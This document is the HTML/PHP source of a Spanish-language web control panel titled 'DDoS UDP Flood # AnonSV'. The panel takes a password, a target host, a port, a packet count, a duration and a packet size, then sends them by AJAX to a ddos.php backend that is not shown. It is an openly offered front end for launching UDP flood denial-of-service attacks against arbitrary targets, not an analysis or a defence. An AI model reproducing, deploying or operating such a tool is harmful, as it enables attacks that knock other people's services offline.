<!DOCTYPE html>
<html>
<head>
	<title>DDoS UDP Flood # AnonSV</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <link rel="stylesheet" href="css/loader.css">
  <link rel="stylesheet" href="https://www.w3schools.com//w3css/3/w3.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.0/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
	<script>
		function microAjax(B,A){this.bindFunction=function(E,D){return function(){return E.apply(D,[D])}};this.stateChange=function(D){if(this.request.readyState==4){this.callbackFunction(this.request.responseText)}};this.getRequest=function(){if(window.ActiveXObject){return new ActiveXObject("Microsoft.XMLHTTP")}else{if(window.XMLHttpRequest){return new XMLHttpRequest()}}return false};this.postBody=(arguments[2]||"");this.callbackFunction=A;this.url=B;this.request=this.getRequest();if(this.request){var C=this.request;C.onreadystatechange=this.bindFunction(this.stateChange,this);if(this.postBody!==""){C.open("POST",B,true);C.setRequestHeader("X-Requested-With","XMLHttpRequest");C.setRequestHeader("Content-type","application/x-www-form-urlencoded");C.setRequestHeader("Connection","close")}else{C.open("GET",B,true)}C.send(this.postBody)}};
	</script>
</head>
<body onload="myFunction()" style="margin:0;">
<div id="loader"></div>
	<?php include "php/navbar.php"; ?>
<div style="display:none;" id="myDiv" class="animate-bottom">
<div class="jumbotron text-center">
<h1 style="color: gray; background-color: transparent; font-size:22px; text-shadow: 0px 2px 3px dodgerblue">DDoS AnonSV</h1>
  <p>Script DDoS UDP Flood</p> 
</div>
<!-- Display the countdown timer in an element -->
<p id="demo"></p>
<?php $ip = $_SERVER['REMOTE_ADDR']; ?>
<div class="container">
    <div class="panel panel-default">
      <div class="panel-heading">DDoS Privado.</div>
      <div class="panel-body">Para usar este DDoS se requiere una contraseña.</div>
	</div>
	<div id="ddos">
	    <div class="input-group">
		<span class="input-group-addon"><i class="glyphicon glyphicon-eye-open"></i></span>
		<label></label><input class="form-control" id="disabledInput" type="text" placeholder="Tu IP: <?php echo $ip; ?>" disabled><br/>
		</div>
	    	<div class="input-group">
		<span class="input-group-addon"><i class="glyphicon glyphicon-screenshot"></i></span>
		<label></label><input class="form-control" type="text" id="host" placeholder="Host: www.prueba.com"><br/>
		</div>
		<div class="input-group">
		<span class="input-group-addon"><i class="glyphicon glyphicon-filter"></i></span>
		<label></label><input class="form-control" type="number" id="port" max=65535 min=1 step=1 placeholder="Puerto: 1-65535"><br/>
		</div>
		<div class="input-group">
		<span class="input-group-addon"><i class="glyphicon glyphicon-transfer"></i></span>
		<label></label><input class="form-control" type="number" id="packet" min=1 step=1 placeholder="Paquetes 1-100"><br/>
		</div>
		<div class="input-group">
		<span class="input-group-addon"><i class="glyphicon glyphicon-time"></i></span>
		<label></label><input class="form-control" type="number" id="time" min=1 step=1 placeholder="Tiempo: 1-60"><br/>
		</div>
		<div class="input-group">
		<span class="input-group-addon"><i class="glyphicon glyphicon-fire"></i></span>
		<label></label><input class="form-control" type="number" id="bytes" max=65000 min=1 step=1 placeholder="Bytes: 1-65000"><br/>
		</div>
		<div class="input-group">
		<span class="input-group-addon"><i class="glyphicon glyphicon-eye-close"></i></span>
		<label></label><input class="form-control" type="password" id="pass" placeholder="Contraseña"><br/>
		</div>
		<br></br>
		<button class="btn btn-info" id="send" onClick="javascript:fire();">Iniciar</button>
		<br/><br/>
		<div class="input-group">
		<span class="input-group-addon">Registro</span>
		<textarea id="log" class="form-control" rows="10" cols="50"></textarea>
	</div>
</div>
</div>

<script>
var myVar;

function myFunction() {
    myVar = setTimeout(showPage, 3000);
}

function showPage() {
  document.getElementById("loader").style.display = "none";
  document.getElementById("myDiv").style.display = "block";
}
</script>

	<script>
		function fire(){
			var host=document.getElementById("host").value;
			var port=document.getElementById("port").value;
			var packet=document.getElementById("packet").value;
			var time=document.getElementById("time").value;
			var pass=document.getElementById("pass").value;
			var bytes=document.getElementById("bytes").value;
			var _log=document.getElementById("log");
			
			if(host!="" && pass!=""){
				var url='./ddos.php?pass='+pass+'&host='+host+(port!=""? '&port='+port:'')+(time!=""? '&time='+time:'')+(packet!=""? '&packet='+packet:'')+(bytes!=""? '&bytes='+bytes:'');
				console.log(url);
				microAjax(url, function(result) { _log.value=result; });
			}
		}
	</script>
</body>
</html>
